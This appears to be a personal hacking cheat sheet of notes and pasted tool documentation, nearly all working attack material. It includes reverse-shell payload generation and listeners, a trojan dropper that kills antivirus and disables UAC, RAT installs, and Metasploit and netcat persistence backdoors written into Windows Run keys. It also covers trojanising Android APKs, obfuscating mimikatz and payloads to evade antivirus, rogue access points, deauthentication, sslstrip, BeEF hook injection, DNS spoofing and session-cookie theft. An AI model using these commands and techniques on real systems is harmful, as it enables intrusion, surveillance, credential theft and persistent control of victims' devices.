-e, --encode x64 "tp encode they payload


-v PY_FILE, --scriptlet PY_FILE


"payload EXs:""basic windows payload"
generate -i 192.168.1.11 -p 443 -t windows

generate -i 192.168.1.11 -p 443 -a x64 -t windows


"choose where to save file with -d"
generate -i 192.168.1.11 -p 443 -t windows -d /root/ 

generate -i 192.168.1.11 -p 443 -t windows -d /var/www/html


"encoded windows payload"
generate -i 192.168.1.11 -p 443 --encode -a x64 -t windows 


"encoded windows with name change after -o Choose file name"
generate -i 192.168.1.11 -p 443 --encode -a x64 -t windows 
-o SHELL

"py-script that execute before start connection to be added to the script"
generate -i 192.168.1.77 -p 443 --encode -a x64 -t windows -v PY_FILE


"make a windows payload saved to the apache2 server folder named shell with encoding"
generate -i 192.168.1.11 -p 443 --encode -a x64 -t windows 
-o SHELL -d /var/www/html


"START A  listen AND WAIT FOR PAYLOAD TO CONNECT"

 listen -p 443

sessions    "to se the sessions"


sessions -c 1  "to pick sessions 1"
***********************************************************************8
how to use remote ddl injector "use dll files and memery snd proccess injection to try to bypass av"

Usage:

This injector assumes you provide a valid DLL path (e.g. C:\Windows\System32\cryptext.dll)

DLL_Injector.exe <Executable_Name> <Path_To_DLL>

A specific example:

DLL_Injector.exe Receiver.exe C:\Windows\System32\cryptext.dll

See my blog post explaining how CreateRemoteThread, VirtualAlloxEx, and LoadLibrary can be used to inject a DLL. Note that this is a noisy way to inject a DLL into a remote process.

"side note"
Privilege escalation via DLL injection it is also possible with PowerSploit as well. The msfvenom can be used to generate the malicious DLL and then through the task manager the PID of the target process can be obtained. If the process is running as SYSTEM then the injected DLL will run with the same privileges as well and the elevation will be achieved.


********************************************************************************************
how to trick networks and people to hide your device on a network

"simply name your device the same exact name as the device you want to appare as once done do a nmap scan to verify if it work your inter ip address should be the same but on nmap and other tools it will appare as the device you copied the name of"



#NOTES "CHEAT SHEET"

*************************************************************************************************
how to install and use pupy RAT

"installation"

cd pupy

git submodule init

git submodule update





*********************************************************************************************************
#how to use Dr0p1t framework "dropit framework" trojan dropper maker

positional arguments:
  Malware_url     Url to your malware

optional arguments:
  -h, --help      show this help message and exit
  -s              Add your malware to startup (Persistence)
  -t              Add your malware to task scheduler (Persistence)
  -a              Add your link to powershell user profile (Persistence)
  -k              Kill antivirus process before running your malware.
  -b B            Run this batch script before running your malware. Check
                  scripts folder
  -p P            Run this powershell script before running your malware.
                  Check scripts folder
  -v V            Run this vbs script before running your malware. Check
                  scripts folder
  --runas         Bypass UAC and run your malware as admin
  --spoof SPOOF   Spoof the final file to an extension you choose.
  --zip           Tell Dr0p1t that the malware in the link is compressed as
                  zip
  --upx           Use UPX to compress the final file.
  --nouac         Try to disable UAC on victim device
  -i I            Use icon to the final file. Check icons folder.
  --noclearevent  Tell the framework to not clear the event logs on target
                  machine after finish.
  --nocompile     Tell the framework to not compile the final file.
  --only32        Download your malware for 32 bit devices only
  --only64        Download your malware for 64 bit devices only
  -q              Stay quite ( no banner )
  -u              Check for updates
  -nd             Display less output information

Examples :
./Dr0p1t.py Malware_Url [Options]
./Dr0p1t.py https://test.com/backdoor.exe -s -t -a -k --runas --upx
./Dr0p1t.py https://test.com/backdoor.exe -k -b block_online_scan.bat --only32
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1 --runas
./Dr0p1t.py https://test.com/backdoor.zip -t -k --nouac -i flash.ico --spoof pdf --zip

Note : Scripts like (bat\ps1\vbs) can only loaded from the scripts folder.
        So if you wanna use custom scripts made by yourself,put it in the scripts folder.
None







***********************************************************************
how to use python-fud-meterpreter tool

Features:

1. Automatic Persistance (Since Python meterpreter is not supported)
2. Peristent Backdoor (Payload will install to users system and run on startup)
3. Keep-Alive Connection (Persistent Connection with the host)

How to use:

1. git clone https://github.com/lfasmpao/python-fud-payload
2. cd python-fud-payload
3. python generate.py






***********************************************************************************
how to use auto-py-to-exe to make .py files into exe files


Usage: auto-py-to-exe [-nc] [-c [CONFIG]] [filename]

Argument 	Type 	Description
filename 	positional 	Pre-fill the "Script Location" field in the UI.
-nc, --no-chrome 	optional 	Open the UI using the default browser (which may be Chrome). Will not try to find Chrome
-c [CONFIG], --config [CONFIG] 	optional 	Provide a configuration file (json) to pre-fill the UI. These can be generated from the bottom of the advanced tab when you have setup your options.

    If you are running this package locally, you will need to call python -m auto_py_to_exe instead of auto-py-to-exe


*********************************************************************
#check kali version and indo

whoami   "see user"

cat /etc/os-release

lsb_release -a

***************************************************************************
change dns provider to be more anon


cat /etc/resolv.conf   "to see current dns server"

leafpad /etc/dhcp/dhclient.conf     "to change dns"

"uncomment prepend domain-name-server""add your new dns ip address"

use www.opendns.com

208.67.222.222,208.67.220.220;


****************************************************************************
sniff cell traffic with wireshark
"MUST BE ON SAME WIFI use tools to crack wifi pass or hot hotspos and fake aps"
"first generate a psk key using "https://www.wireshark.org/tools/wpa-psk.html" and entering the info needed this will decypt traffic for a ssid"


"then put your wifi usb chipset in monitor mode"
airmon-ng start wlan0mon

airmon-ng check kill wlan0mon

"you can use any dos attack to boot the devices to start sniffing with the grabbed key""aireplay-ng --deauth 20000 -a "place mac of access point" -c "place mac of client you want kicked off" wlan0mon"to deauth"

"then open wireshark and listen to # "eapol traffic" use filters this will show you new traffic"
"go to prefrenaces / protocals / IEEE80211 and select enable decytption goto wpa-psk and paste key from the site" 


"filters to try "dns" "http" 







*****************************************************************************************************************
how to install wifipumpkin3 on Kali Linux

the Kali Linux by default has installed python3.8 is compartible with wp3, I recommend to install somes system packages, os-level dependencies.

 $ sudo apt install libssl-dev libffi-dev build-essential
 $ git clone https://github.com/P0cL4bs/wifipumpkin3.git
 $ cd wifipumpkin3

now, we need to install the PyQt5, it very easy:

sudo apt install python3-pyqt5

or check if the pyqt5 is installed successful:

python3 -c "from PyQt5.QtCore import QSettings; print('done')"

now, if you got the message done, nice. the next step is install the wp3:

 $ sudo python3 setup.py install

if you see this message bellow, everything ok !

    Finished processing dependencies for wifipumpkin3==1.0.0

now, let’s execute the app:

$ sudo  wifipumpkin3

Main Features

    Rogue access point attack
    Man-in-the-middle attack
    Module for deauthentication attack
    Module for extra-captiveflask templates
    Rogue Dns Server
    Captive portal attack (captiveflask)
    Intercept, inspect, modify and replay web traffic
    WiFi networks scanning
    DNS monitoring service
    Credentials harvesting
    Transparent Proxies
    LLMNR, NBT-NS and MDNS poisoner (Responder3)
    and more!


Interactive Session

Once started the tool with sudo wifipumpkin3 , you’ll be presented with an interactive session like the metasploit framework where you can enable or disable modules, plugin, proxy configure the ap and etc.

The interface CLI is very simple, basic commands you’ll need to perform operations such as setting a session like accesspoint (AP) information (bssid, channel, interface), start/stop accesspoint and monitor clients activitys joined on AP.

usage
let’s take a look, how to create a script for set the interface, enable to start without proxy,set ssid the network, set work without log for dns and start the access point.

# configure the interface
set interface wlan1
# set name of access point will be created
set ssid demo
# set noproxy plguin
set proxy noproxy
# ignore all log from pydns_server
ignore pydns_server
# start the Access Point
start 

Once saved as demo.pulp file, you’ll be able to load and execute it via:

sudo wifipumpkin3 –pulp /path/to/demo.pulp

if you not want to use .pulp file, exist a options to use the paraments –xpulp or -x and each command can either be executed singularly, or concatenated by the ; in string. for example:

sudo wifipumpkin3 –xpulp “set interface wlan1; set ssid demo; set proxy noproxy; start”

Arguments Commands

The basic command line arguments ( wifipumpkin3 -h ) are:

-i INTERFACE

Network interface to bind to, if empty the default interface is old session started.

-s SESSION

Session for continue attack, if you pass the old session id, all log will be added on same session.

–pulp PULP

Interactive sessions can be scripted with .pulp file,a powerful way to automate your attack.

–xpulp XPULP

each command can either be executed singularly, or concatenated by the ; in string.

–wireless-mode WIRELESS_MODE

Use this options for set the wireless mode (static, docker), by default is static mode, but you can change if you want to run on docker container.

–no-colors

disable terminal colors and effects.

-v, –version

show program’s version number and exit.

Core Commands

    help
        Will list all available commands available
    clients
        show all clients connected on Access Point with advanced UI
    ap
        show all variable and status for settings AP. You can see (bssid, ssid, channel, security, or status ap)
    set
        set variable proxy,plugin and access point, this command set is like metasploit set command.
    start
        start access point (AP), if not something wrong the will be see a new AP with hostapd program. also the proxy,plugin should be initialized.
    stop
        stop access point, process, thread, plugin and proxy’s that is running in background.
    ignore
        the message logger will be ignored, the parameters can be ( captiveflask, pumpkinproxy, pydns_server sniffkin3 ). if you type this command not be see anymore log in console WP.
    restore
        the message logger will be restored, as you can see above this command is inverse of ignore with same parameters will be restore the console log.
    info
        get info from the proxy/plugin, this command show some informations of proxy/plugin like (log path, config path, description )
    jobs
        show all threads/processes in background. Sometimes you need to find the process id or thread name of process created by WP.
    mode
        show all wireless mode available.
    plugins
        show all plugins available and their status.
    proxys
        show all proxy available and their status.
    show
        show available modules.
    search
        search modules by name, this will be implemented in the future when million OD modules :sunglasses: is available
    use
        select module for modules, full inspiration in metasploit modules.

Examples

Plugins

The plugins are designed to add features to WP3 core and run parallel with access point (AP), WP3 provides facilities to develop plugins. Generally speaking, there is really a few things you have to do in order to get a plugin working.

Info

The most important is you can run multi plugins simultaneously, because the plugins has been designed to work only monitor and analyse the traffic generate by users connected on access point.

The basic command guidelines to get a plugins are:

if you want to enable or disable the plugin, follow command bellow.

wp3 > set plugin plugin_name true/false

if the plugin has subplugins, when type plugins you see somes options for set. you can to enable/disable subplugins with command, type tab to autocomplete ;):

wp3 > set plugin_name.subplugins_name true/false

Plugin developers and users are welcome to include your plugin into this project, take a look the guidelines how to create a plugin.

Proxys

The Proxys are designed to add features to WP3 core and run parallel with access point (AP), but redirect all traffic with iptables. Proxies work by intercepting a request, modifying the request if necessary, then handling or forwarding the request to its destination. When a user connects to a AP, the transparent proxy intercepts the request before passing it on to the provider.

Info

The most important is you can run one proxies each time , because the proxies has been designed to work for manipulate data packets redirecting all data for a specific port number

Available Porxy’s:

    pumpkinproxy – Proxy for intercept network traffic on TCP protocol doc
    captiveflask – Allow block Internet access for users until they open the page login page. doc
    noproxy – Running without proxy redirect traffic

The basic command guidelines to get a plugins are:

if you want to select the proxy, follow command bellow.

wp3 > set proxy proxy_name

if the proxy has plugins, when type proxys you see somes options for set. you can to enable/disable plugin command, type tab to autocomplete ;):

wp3 > set proxy_name.plugin_name true/false

The example above is for enable/disable a plugin, but you can use same syntax to configure plugin parameter. you can see this parameter typing info proxy_name or using type like this example bellow, using tab to autocomplete.

wp3 > set pumpkinproxy. pumpkinproxy.beef pumpkinproxy.html_inject pumpkinproxy.beef.url_hook pumpkinproxy.html_inject.content_path pumpkinproxy.downloadspoof pumpkinproxy.js_inject pumpkinproxy.downloadspoof.backdoorExePath pumpkinproxy.js_inject.url pumpkinproxy.downloadspoof.backdoorPDFpath pumpkinproxy.no-cache pumpkinproxy.downloadspoof.backdoorWORDpath pumpkinproxy.replaceImages pumpkinproxy.downloadspoof.backdoorXLSpath pumpkinproxy.replaceImages.path wp3 > set pumpkinproxy.

let now set url_hook parameter the plugin beef to inject javascript in all request http.

wp3 > set pumpkinproxy.beef.url_hook http://172.16.149.141:3000/hook.js

Proxys developers and users are welcome to include your proxy into this project, take a look the guidelines how to create a proxy.

Modules

A module provides a features that not is necessary to use with access point, the must modules are projected for add a new functionality into attack, like devices discovery, services enumeration, perform deauthentication attacks and etc. Modules are introduced to add more functionalities to complement the attack.

Info

the syntax of modules basically follow the struct the modules of `metasploit`

The basic core command guidelines:
Commands	Descriptions
set	set options for module
back	go back one level
help	show avaliable commands
options	show options of current module
run	execute module



EXAMPLE:

sudo  wifipumpkin3         "to start wifipumpkin3"

proxyies                 "list all proxies"

set proxy pumpkinproxy   "set a proxy"

plugins                          "list pluigins"

set plugin responder3 true          "turn on a plugin in this case responder"

help security           "get a rundown on sec options"

set security false              "turn wep wpa and wpa2 keys off"

ap                  "check ap status"

start              "start ap with set settings"



EXAMPLE2:

proxyies

set proxy captiveflask

set captiveflask.Darklogin true

help security           "get a rundown on sec options"

set security true

ap

set security.wpa       "set sec type"

set plugin sniffkkin3 true         "turn on plugin"

start              "start ap with set settings"

*****************************************************************************************
how to use InstagramOSINT "to find info pulled from instagram"


This is useful when trying to apply this codebase to any projects. The API is really simple to use and uses python features to make it easier to use such as indexing

Examples:

python3 main.py --@erniereynso USERNAME

from InstagramOSINT import *

instagram = InstagramOSINT(username='USERNAMEHERE')

print(instagram.profile_data)

print(instagram['Username'])

instagram.print_profile_data()

instagram.save_data()

instagram.scrape_posts()




*************************************************************************************************************************
WINDOWS PERSISTANCE METHODS 

n this article, you will learn the multiple ways to maintain access or create a persistent backdoor with the help of the Metasploit Framework on the host machine which you have compromised.
Table of Content

Persistence Backdoor

Pre-requisites

Methods for Generating persistence using Metasploit

    Persistence_service
    Mitigation method for persistence_service exploit.
    Persistence_exe
    Mitigation method for persistence_exe exploit.
    Registry_persistence
    Mitigation method for Registry_persistence exploit.
    Persistence through Netcat.
    Persistence through Remote Desktop Protocol.

 Conclusion
Persistence Backdoor

The word Persistence is simply known as permanent hence in this post, we are sharing the multiple methods to generate a permanent backdoor within the victim machine.

As there is a lot of hard work required to exploit any system and once the system is exploited successfully you need more time for further examine or penetrate the victim’s system but at that time if victim shut down his system or changed the credentials then all your hard work will be spoiled. That’s why maintaining access is an important phase of penetration testing. Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials and other interruptions that could cut off their access.
Pre-requisites

Window 10 -Victim System

Kali Linux – Attacker (Metasploit Framework)

Note: For creating a persistence backdoor, you should have a compromised machine of the victim with meterpreter session to continue all practices that are taught in this post.
Methods for Generating persistence using Metasploit

Let’s start, we already have compromised the window 10 (victim’s PC) and have meterpreter session along with the admin rights. To know how to get admin access click here. Now, we want to leave a permanent backdoor in the victim system that will provide a reverse connection for the next time.
Service Persistence

This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.

Thus, we will run the following commands on Kali Linux to run the above-listed module:
use exploit/windows/local/persistence_service
set session 2
set lport 5678
exploit
1
2
3
4
	
use exploit/windows/local/persistence_service
set session 2
set lport 5678
exploit

Above said module which will generate and upload an executable on the victim’s system under the /temp directory as  “lVFC.exe” and will make it a persistence service.

If the victim reboots the system, the previous meterpreter session will be closed. Only we need to set up the multi handler to run the payload by using the following commands:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 5678
exploit
1
2
3
4
5
	
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 5678
exploit

Once the victim system starts, automatically we will gain the meterpreter session again.

When the PC is started automatically some of its services starts by default so persistence_service exploit creates a new service that will start the payload whenever the service is running. In the below image you can see the executable file IVFC.exe is running under username System and we can verify its path.

C:/Windows/Temp/IVFC.exe

#Mitigation method for persistence_service exploit

First of all, identify the unfamiliar files which are running and then stop the running executable format file i.e. IVFC.exe and delete it from the temp directory.
Persistence_exe

This is the second method to maintain access to the victim’s PC. Under this scenario, we already have meterpreter session of the victim’s PC and it has user access.

This module will upload an executable to the victim’s system and make it persistent. It can be installed as a user, system or service. We will use this module by using the session 1(already compromised system’session) and set the rexpath (remote executable path), through this payload file will create on victim’s PC but due to persistence script, it will save under temp directory with default.exe name(change the name under rexname option ) and will set it to autorun under the registry path mentioned in below image.

 To run this module, type the following commands:
use post/windows/manage/persistence_exe
set session 1
set rexepath /root/payload.exe
exploit
1
2
3
4
	
use post/windows/manage/persistence_exe
set session 1
set rexepath /root/payload.exe
exploit

After, successful execution of the above module, now we have to set up the multi handle by using the following command:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 1234
exploit
1
2
3
4
5
	
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 1234
exploit

Once the victim reboots its PC and the login into it, automatically we will get the meterpreter session.

In the below image you can see the function of persistence_exe, which will create the autorun service under the registry editor path:
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO
1
	
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO

due to which service will start running as soon as the victim’s PC starts. Its default file creates under the temp directory.

#Mitigation Method for Persistence_exe

First, remove the entry from the registry editor under the path:
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO
1
	
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO

And then delete the executable payload file under the temp directory and reboot the system.
Registry Persistence

A registry is the core part of the window and contains a surplus of raw data. Attackers love to choose windows registry locations to hook their codes so that files or codes cannot be detected by scans for suspicious activities.

This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in “CurrentVersion\Run” (depending on privilege and selected method). The payload will be installed completely in the registry.

Since we already have compromised the victim’s Pc and have the meterpreter session along with the user privileges. Use the following command to execute the registry persistence.
use exploit/windows/local/registry_persistence 
set session 1
set lport 7654
exploit
1
2
3
4
	
use exploit/windows/local/registry_persistence 
set session 1
set lport 7654
exploit

Once the exploit executed, it will create a registry key under HKCU\software\wl4cN9w and installed key as highlighted in the image.

If the victim reboots the system, meterpreter session will dead get the session again just set up the multi handler payload and execute it.
use exploit/multi/handler
set set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 7654
exploit
1
2
3
4
5
	
use exploit/multi/handler
set set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.115
set lport 7654
exploit

Once the victim’s machine will start and as the victim will log in into the system, automatically we will get the meterpreter session again due to the autorun script under the registry which is installed by the attacker. Successfully registry _persistence is executed.

Through the below image you can verify the path of registry key created by registry_persistence exploit.

#Persistence through Netcat

Netcat or nc is a utility tool that uses TCP and UDP connections to read and write in a network. It can be used for both attack and security. In the case of attack, it can be driven by scripts which makes it quite dependable back-end and if we talk about security, it helps us to debug the network along with investing it. To read more about netcat please refer https://www.hackingarticles.in/comprehensive-guide-on-netcat/.

Now we are going to make a persistence Netcat backdoor on the compromised system. As we already have meterpreter session, upload netcat.exe into system32 file of victim’s pc by using the following command:
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
1
	
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32

The next step is to set the netcat to listen on the random port i.e.4445, open the port on startup and make the connection.

Use the following command:
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'
1
	
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'

On successful netcat connection, we get the shell of the victim’s PC.

We will add the new rule in the firewall named as ‘netcat’ in which inbound connection will allow for port 4445 by using the interactive cmd prompt running a command called netsh. Type the following command:
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
1
	
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445

To check the operational mode and port status run the command:
netsh firewall show portopening
1
	
netsh firewall show portopening

When the victim reboots the system again, we will get the netcat shell. On Kali Linux(attacker system) run the following command to connect our netcat backdoor via port 4445.
nc -nv 192.168.0.142 4445
1
	
nc -nv 192.168.0.142 4445

#Persistence through RDP

After having the meterpreter session of the already compromised targeted system. We will utilize Carlos Perez’s getgui script which enables Remote Desktop and creates a user account to login to it.

Username: Nisha

Password: 123

Run the following command:
run getgui -e -u nisha -p 123
1
	
run getgui -e -u nisha -p 123

With the help of the following module, it is possible to apply the ‘sticky keys’ hack to a session with appropriate rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP login screen or via a UAC confirmation dialog.
use post/windows/manage/sticky_keys
set session 2
exploit
1
2
3
	
use post/windows/manage/sticky_keys
set session 2
exploit

As you can see here that we sticky is added successfully, now to launch the exploit at an RDP or UAC by press shift key 5 times.

Now we will check the connection using rdesktop and review the certificate and type Yes. By using the following command
rdesktop 192.168.0.142
1
	
rdesktop 192.168.0.142


"metsvc backdoor"
run metsvc -h

We will now use the multi/handler with a payload of windows/metsvc_bind_tcp to connect to the remote system. This is a special payload, as typically a Meterpreter payload is multi-stage, where a minimal amount of code is sent as part of the exploit, and then more is uploaded after code execution has been achieved.

Think of a shuttle rocket, and the booster rockets that are used to get the space shuttle into orbit. This is much the same, except instead of extra items being there and then dropping off, Meterpreter starts as small as possible, then adds on. In this case however, the full Meterpreter code has already been uploaded to the remote machine, and there is no need for a staged connection.

We set all of our options for metsvc_bind_tcp with the victim’s IP address and the port we wish to have the service connect to on our machine. We then run the exploit.

msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
PAYLOAD => windows/metsvc_bind_tcp
msf exploit(handler) > set LPORT 31337
LPORT => 31337
msf exploit(handler) > set RHOST 192.168.1.104
RHOST => 192.168.1.104
msf exploit(handler) > show options

Module options:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/metsvc_bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LPORT     31337            yes       The local port
   RHOST     192.168.1.104    no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > exploit



run persistance -h

for meterpreter persistances options




"always set r host for these windows exploits"

persistance exploit

windows/local/s4u_persistance

windows/local/persistance

 



**************************************************************************************************
# how to use ahmyth



    git clone https://github.com/AhMyth/AhMyth-Android-RAT.git
    cd AhMyth-Android-RAT/AhMyth-Server
    npm start











*******************************************************************************************************
how to use xencrypt 

this tool encodes powershell commandsand or payloads

Usage "this tool is for windows it needs powershell to run"

Import-Module ./xencrypt.ps1
Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1

You will now have an encrypted xenmimi.ps1 file in your current working directory. You can use it in the same way as you would the original script, so in this case:

Import-Module ./xenmimi.ps1
Invoke-Mimikatz

It also supports recursive layering via the -Iterations flag.

Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100




********************************************************************************
see apache2 logs 

cat /var/log/apache2/access.log

tail -f /var/log/apache2/access.log



******************************************************************************************************
#how to use apkbleach to help evade AV and change icon of payload

./apkbleach -h   "help list"


"make a apk with a icon"
./apkbleach -g  android/meterpreter/reverse_https LHOST=192.168.1.222 LPORT=443 -i BLEACH_settings.png -o /var/www/html/settings.apk

 


*******************************************************************************************************
#how to use kwetza


Usage

python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no customClass

    nameOfTheApkToInfect.apk = name of the APK you wish to infect.
    https/tcp = select either a HTTPS or TCP connection
    LHOST = IP of your listener.
    LPORT = Port of your listener.
    yes = include "yes" to inject additional evil perms into the app, "no" to utilize the default permissions of the app.
    customClass = Specify a custom activity here if you want Kwetza to inject into this activity.

python kwetza.py hackme.apk https 10.42.0.118 4444 yes com.moo.another.activity
[+] MMMMMM KWETZA
[*] DECOMPILING TARGET APK
[+] ENDPOINT IP: 10.42.0.118
[+] ENDPOINT PORT: 4444
[+] APKTOOL DECOMPILED SUCCESS
[*] BYTING COMMS...
[*] ANALYZING ANDROID MANIFEST...
[+] TARGET ACTIVITY: com.foo.moo.gui.MainActivity
[*] INJECTION INTO APK
[+] CHECKING IF ADDITIONAL PERMS TO BE ADDED
[*] INJECTION OF CRAZY PERMS TO BE DONE!
[+] TIME TO BUILD INFECTED APK
[*] EXECUTING APKTOOL BUILD COMMAND
[+] BUILD RESULT
############################################
I: Using APktool 2.2.0
I: Checking whether source shas changed...
I: Smaling smali folder into classes.dex
I: Checking whether resources has changed...
I: Building resources...
I: Copying libs ...(/lib)
I: Building apk file...
I: Copying unknown files/dir...
###########################################
[*] EXECUTING JARSIGNER COMMAND...
Enter Passphrase for keystore: password
[+] JARSIGNER RESULT
###########################################
jar signed.

###########################################

[+] L00t located at hackme/dist/hackme.apk







**********************************************************************************************************
how to use apk
wash

"make a washed apk for msf"
./apkwash -p android/meterpreter/reverse_https LHOST=192.168.1.222 LPORT=443 -o LegitAndroidApp.apk




*******************************************************************************
How To Use APK TOOL "and make less detectable msfvenom apk payloads


apktool d -f test.apk   "to decomplie a apk file"

apktool b -f test       "to recompile a file dir to a apk again"





#NOTE
"to make a less detectable msfvenom apk payload goto the samli file and change all the words of metasploit to something else this is found in /TEST/smali/com/metasploit/stage/ modify all files in the dir"

use "sed -i 's/metasploit/legit/g' *" to change the metasploit words


use "cat * | grep metasploit"  to check if it worked if it worked no code should appare after the command is entered complie the payload like this for a less detecable msfvenom apk


then recompile the dir made by apktool

if you want to make a even better payload bind the new lwaa detectable payload to a real working legit apk to do so decompile a legit apk you can download these online try www.pureapk.com make a payload dir inside the legit apk it must be in the /smali/com/ dir of the legit apk make a dir named legit and inside that make a dir stage now copy all of the new msfvenom apk code aka files from the stage dir from the msfvenom payload to the legit apk file in the stage dir you made

use "cp /root/test/smali/com/stage/* stage/" make sure they are in the legit apks folder this can be down with terminal commands or mannually 

now we must edit the android menifest we can change permissions to make the install process look less malicious by removing some premissions but we will lose some commands we can change the permissions discriptions we also need to set it up so our payload runs with a hook

"gedit AndroidManifest.xml" to edit the manifest

look for the words main and luncher in the <activity> </activity> brackets



use jarsigner to sign the apk
use this command to sign the apk this helps avoid av and  other detection systems 
"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/test .keystore /root/test.apk"

#make a msfvenom apk payload 
msfvenom -p android/meterpreter/reverse_https LHOST=10.0.0.66 LPORT=443 R > /root/test.apk
*************************************************************************************

Shellsploit 

show     "show and a input to list the options"



show injectors

use injectors/Windows/BFD/Patching

show options

set port 443

set host 192.168.1.77

set file /root/putty.exe

inject 


*************************************************************************************************************************88
bettercap useage "use brideg connect or usb wifi chipset"

"help list"
bettercap -h or run bettercap and type help


"turn on modules"
dns.spoof on    " set dns.spoof.domains *  " 

net.sniff on

http.proxy on


"turn on multi modules"

any.proxy on
http.proxy on
https.proxy on
tcp.proxy on
net.sniff on
net.probe on
arp.spoof on
packet.proxy on
dns.spoof on


"wifi recon and hacking" 

wifi.recon on
wifi.show
set wifi.recon.channel 1                     "sets channel you want to focus on"
set net.stiff.verbose true                   "sets verbose mode for net sniff"
set net.sniff.filter ether proto 0x888e      "filters traffic looked at"
set net.sniff.output wpa.pcap                "sets output file"
net.sniff on
wifi.deauth 48:5d:36:07:77:84               "deauth attacks aka dos atacks a wifi based on mac address use wireshark to look at pcap file"



"sslstrip"

set https.proxy.sslstrip true   "turns on ssl strip"

bettercap --proxy-module NAME -h


"MITM attack a single target start modules for more info spoofing sniffer and http-proxy modules"
bettercap -T 192.168.1.215 --proxy -P POST  


"to pick a interface to listen with"
bettercap -iface eth0 or wlan0 


"turn on ssl strip"
set https.proxy.sslstrip true
set http.proxy.sslstrip true


"inject beef hook"
set http.proxy.script caplets/beef-inject.js
set https.proxy.script caplets/beef-inject.js

set http.proxy.sslstrip true
set https.proxy.sslstrip true

http.proxy on
https.proxy on
arp.spoof on


"how to dns spoof"

dns.spoof on
arp.spoof on 
set arp.internal true

set dns.spoof.address 192.168.1.218
set dns.spoof.domain espn.com
set dns.spoof.all true

"make hosts file"
leafpad dns.conf

"beef-injection"
set proxy dnspoof on
set http.proxy.script /root/beef-hook.js
set http.proxy on


"sniff passsowrds"
bettercap -caplet caplets/local-sniffer.cap



"js injection inject beef hook to one target"
bettercap -T 192.168.1.215 --proxy-module --js-url "https://192.168.1.218:3000/hook/js"

"js inject beef hook all devices"
bettercap -I eth0 --proxy-module injectjs --js-url "http://192.168.1.218:3000/hook.js"


    InjectJS ( --proxy-module injectjs ) : Used to inject javascript code/files inside HTML pages.
    InjectCSS ( --proxy-module injectcss ) : Used to inject CSS code/files inside HTML pages.
    InjectHTML ( --proxy-module injecthtml ) : Used to inject HTML code inside HTML pages.

HTTP/HTTPS proxy modules might want additional command line arguments, it's always a good idea to look at their specific help menus:



*******************************************************************************************************************************
#How to inject java script in a website malious javascript injection and maloius javascript code



javascript:alert(document.cookie);        "use this in the broswer search bar on a website to see if it can grab the current sessions cookies information if that site site muat be venerable"


javascript:void(document.cookie)="session_id=<<pther session id>>");  "if you find a session that uses sessions_id to store the cookies we can add a sessions id vaule with this code"




************************************************************************************************
#how to use cryptr to encrypt exe and other files this can be used to make fud payloads


sage: cryptr command <command-specific-options>

  encrypt <file>       Encrypt file
  decrypt <file.aes>   Decrypt encrypted file
  help                 Displays help
  version              Displays the current version


example:
bash cryptr.bash encrypt payload.exe      "this will encrypt a exe file in this case a payload"


*********************************************************************************************************
#how to use nxcrypt and install nxcrpt "encrypt .py files"

git clone https://github.cim/Hadi999/NXcrypt.git

"goto the nxcrypt folder and make msfvenom payload inside the nxcrypt folder"

msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.222 LPORT=443 -o test.py

msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 -o test.py

you may have to chmod +x the NXcrypt script"
python NXcrypt.py --file=/root/test.py --output=payload.py

"enter a password to unlock encryption when asked"


"use pyinstaller to make a py file a exe file"

pyinstller --onefile /root/test.py


use metasploit to handle payload use encoded stagers and https or rc4 payloads for max av evasion"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit


More examples

python NXcrypt.py --file=/var/www/html/test.py --output=/var/www/html/encryptedFUDshell.py






*************************************************************************************************************
#methods to install python on windows using cmd or powershell


"method 1"
the best way to install Python through Windows Command Prompt will be through Chocolatey (Windows Package Manageer).

Steps to install python 3 will be as follows :-

    Open CMD using 'Run as Administrator'.

    Download and Install Chocolatey using the following command.

